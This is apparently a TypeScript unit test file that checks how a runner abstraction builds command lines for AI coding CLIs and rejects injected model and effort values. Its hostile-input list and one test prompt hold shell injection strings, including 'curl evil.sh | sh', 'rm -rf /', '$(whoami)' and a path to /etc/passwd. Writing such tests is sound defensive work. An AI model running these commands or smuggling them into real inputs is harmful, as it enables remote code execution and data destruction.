// Hermetic unit tests for the runner abstraction. Nothing is spawned and no PATH is touched — these
// exercise ONLY the pure argv/validation/parsing boundary. A hostile model or effort value reaching argv
// defeats the point of the validation, so the injection cases are asserted explicitly.
import { describe, expect, test } from "bun:test";
import {
  type RunnerName,
  type RunnerSpec,
  RUNNERS,
  RUNNER_EFFORTS,
  buildRunnerArgs,
  contractLine,
  detectRunners,
  isRunnerName,
  parseRunnerOutput,
  validateEffort,
  validateModel,
} from "./index.ts";

const PROMPT = "implement issue #7\nfollow the criteria";
const spec = (over: Partial<RunnerSpec> & Pick<RunnerSpec, "runner" | "role">): RunnerSpec => ({
  prompt: PROMPT,
  cwd: "/tmp/wt",
  ...over,
});

// Values a repo-controlled label could smuggle in. Every one must be dropped, not passed through.
const HOSTILE = [
  "$(whoami)",
  "`id`",
  "opus; rm -rf /",
  'opus"; curl evil.sh | sh; #',
  "opus\nsonnet",
  "opus sonnet",
  "opus&&id",
  "opus|tee /tmp/x",
  "../../etc/passwd",
  "оpus", // cyrillic о — homoglyph
  "",
  "   ",
];

describe("buildRunnerArgs — claude", () => {
  test("implement: prompt is one argv element, structured output, scoped allow-list", () => {
    const argv = buildRunnerArgs(
      spec({
        runner: "claude",
        role: "implement",
        model: "opus",
        effort: "high",
        allowedTools: ["Edit", "Read", "Bash(git:*)"],
      }),
    );
    expect(argv).toEqual([
      "claude",
      "-p",
      PROMPT,
      "--output-format",
      "json",
      "--model",
      "opus",
      "--effort",
      "high",
      "--permission-mode",
      "acceptEdits",
      "--allowedTools",
      "Edit Read Bash(git:*)",
    ]);
    expect(argv.filter((a) => a === PROMPT)).toHaveLength(1);
  });

  test("implement: no allow-list configured → the flag is omitted, never passed empty", () => {
    const argv = buildRunnerArgs(spec({ runner: "claude", role: "implement" }));
    expect(argv).not.toContain("--allowedTools");
    expect(argv).toContain("acceptEdits");
  });

  test("implement: --bypass swaps the permission mode and drops the allow-list", () => {
    const argv = buildRunnerArgs(
      spec({
        runner: "claude",
        role: "implement",
        bypassPermissions: true,
        allowedTools: ["Edit"],
      }),
    );
    expect(argv).toContain("bypassPermissions");
    expect(argv).not.toContain("--allowedTools");
  });

  test("review: read-only tools by default, and bypass cannot unlock them", () => {
    const argv = buildRunnerArgs(
      spec({
        runner: "claude",
        role: "review",
        bypassPermissions: true,
        allowedTools: ["Edit", "Write"],
      }),
    );
    expect(argv).toContain("--allowedTools");
    expect(argv[argv.indexOf("--allowedTools") + 1]).toBe("Read Grep Glob");
    expect(argv).not.toContain("bypassPermissions");
    expect(argv.join(" ")).not.toContain("Write");
  });
});

describe("buildRunnerArgs — codex", () => {
  test("implement: exec subcommand, JSONL events, model + reasoning effort", () => {
    const argv = buildRunnerArgs(
      spec({ runner: "codex", role: "implement", model: "gpt-5-codex", effort: "high" }),
    );
    expect(argv).toEqual([
      "codex",
      "exec",
      PROMPT,
      "--json",
      "-m",
      "gpt-5-codex",
      "-c",
      "model_reasoning_effort=high",
    ]);
  });

  test("review: an output schema pins the verdict shape", () => {
    const argv = buildRunnerArgs(
      spec({ runner: "codex", role: "review", outputSchemaPath: "/tmp/rubric.schema.json" }),
    );
    expect(argv).toContain("--output-schema");
    expect(argv[argv.indexOf("--output-schema") + 1]).toBe("/tmp/rubric.schema.json");
  });

  test("codex rejects claude's effort vocabulary — the flag is dropped, not forwarded", () => {
    const argv = buildRunnerArgs(spec({ runner: "codex", role: "implement", effort: "xhigh" }));
    expect(argv).not.toContain("-c");
  });
});

describe("buildRunnerArgs — opencode", () => {
  test("implement: run subcommand, provider-qualified model, variant effort", () => {
    const argv = buildRunnerArgs(
      spec({
        runner: "opencode",
        role: "implement",
        model: "anthropic/claude-opus-4-8",
        effort: "max",
      }),
    );
    expect(argv).toEqual([
      "opencode",
      "run",
      PROMPT,
      "--format",
      "json",
      "-m",
      "anthropic/claude-opus-4-8",
      "--variant",
      "max",
    ]);
  });

  test("a slash-qualified model is only legal for opencode", () => {
    expect(validateModel("opencode", "anthropic/claude-opus-4-8")).toBe(
      "anthropic/claude-opus-4-8",
    );
    expect(validateModel("claude", "anthropic/claude-opus-4-8")).toBeUndefined();
  });

  test("only opencode-known efforts survive", () => {
    const argv = buildRunnerArgs(spec({ runner: "opencode", role: "implement", effort: "xhigh" }));
    expect(argv).not.toContain("--variant");
  });
});

describe("hostile label values never reach argv", () => {
  for (const runner of RUNNERS) {
    for (const value of HOSTILE) {
      test(`${runner}: model ${JSON.stringify(value)} is dropped`, () => {
        const argv = buildRunnerArgs(spec({ runner, role: "implement", model: value }));
        expect(validateModel(runner, value)).toBeUndefined();
        // The prompt legitimately carries arbitrary text; check every OTHER element.
        const nonPrompt = argv.filter((a) => a !== PROMPT);
        expect(nonPrompt.some((a) => a.includes(value.trim()) && value.trim().length > 0)).toBe(
          false,
        );
      });
      test(`${runner}: effort ${JSON.stringify(value)} is dropped`, () => {
        expect(validateEffort(runner, value)).toBeUndefined();
        const argv = buildRunnerArgs(spec({ runner, role: "implement", effort: value }));
        expect(
          argv
            .filter((a) => a !== PROMPT)
            .some((a) => a.includes("whoami") || a.includes("rm -rf")),
        ).toBe(false);
      });
    }
  }

  test("a prompt full of shell metacharacters stays exactly one argv element", () => {
    const nasty = "`id`; rm -rf / #\n$(curl evil.sh)";
    const argv = buildRunnerArgs(spec({ runner: "claude", role: "implement", prompt: nasty }));
    expect(argv.filter((a) => a === nasty)).toHaveLength(1);
  });
});

describe("validateEffort / validateModel", () => {
  test("each runner's own vocabulary round-trips, case-insensitively", () => {
    for (const runner of RUNNERS)
      for (const e of RUNNER_EFFORTS[runner])
        expect(validateEffort(runner, e.toUpperCase())).toBe(e);
  });
  test("undefined stays undefined (no accidental default)", () => {
    expect(validateEffort("claude", undefined)).toBeUndefined();
    expect(validateModel("claude", undefined)).toBeUndefined();
  });
  test("known-good model ids pass", () => {
    expect(validateModel("claude", "claude-opus-5")).toBe("claude-opus-5");
    expect(validateModel("claude", "sonnet")).toBe("sonnet");
    expect(validateModel("codex", "gpt-5.1-codex-max")).toBe("gpt-5.1-codex-max");
  });
  test("isRunnerName gates unknown runners", () => {
    expect(isRunnerName("claude")).toBe(true);
    expect(isRunnerName("Claude")).toBe(false);
    expect(isRunnerName("gemini")).toBe(false);
  });
});

describe("parseRunnerOutput", () => {
  test("claude --output-format json → .result", () => {
    const raw = JSON.stringify({
      type: "result",
      is_error: false,
      result: "done\nhttps://github.com/a/b/pull/12",
    });
    const out = parseRunnerOutput("claude", { stdout: raw, exitCode: 0 });
    expect(contractLine(out)).toBe("https://github.com/a/b/pull/12");
    expect(out.raw).toBe(raw);
  });

  test("codex --json → the last event carrying text", () => {
    const raw = [
      JSON.stringify({ msg: { type: "task_started" } }),
      JSON.stringify({ msg: { type: "agent_message", message: "working…" } }),
      JSON.stringify({ msg: { type: "agent_message", message: "https://github.com/a/b/pull/9" } }),
    ].join("\n");
    expect(contractLine(parseRunnerOutput("codex", { stdout: raw, exitCode: 0 }))).toBe(
      "https://github.com/a/b/pull/9",
    );
  });

  test("opencode --format json → nested message content", () => {
    const raw = JSON.stringify({ message: { content: "ALREADY-RESOLVED" } });
    expect(contractLine(parseRunnerOutput("opencode", { stdout: raw, exitCode: 0 }))).toBe(
      "ALREADY-RESOLVED",
    );
  });

  test("non-JSON output degrades to the raw last line instead of throwing", () => {
    const raw = "warning: something\nhttps://github.com/a/b/pull/3\n";
    for (const runner of RUNNERS)
      expect(contractLine(parseRunnerOutput(runner, { stdout: raw, exitCode: 0 }))).toBe(
        "https://github.com/a/b/pull/3",
      );
  });

  test("truncated JSON (crashed mid-stream) degrades, never throws", () => {
    const raw = '{"result": "half a mes';
    for (const runner of RUNNERS)
      expect(() => parseRunnerOutput(runner, { stdout: raw, exitCode: 1 })).not.toThrow();
  });

  test("empty output yields an empty contract line, exit code preserved", () => {
    const out = parseRunnerOutput("claude", { stdout: "", exitCode: 143 });
    expect(out.lastMessage).toBe("");
    expect(out.exitCode).toBe(143);
  });
});

describe("detectRunners", () => {
  test("reports availability + version per runner from the injected lookup", async () => {
    const found: Record<string, { path: string | null; version: string | null }> = {
      claude: { path: "/usr/local/bin/claude", version: "2.1.0" },
      codex: { path: null, version: null },
      opencode: { path: "/opt/bin/opencode", version: "0.4.1" },
    };
    const got = await detectRunners((r: RunnerName) => found[r]!);
    expect(got.map((g) => [g.runner, g.available])).toEqual([
      ["claude", true],
      ["codex", false],
      ["opencode", true],
    ]);
    expect(got[0]!.version).toBe("2.1.0");
  });
});
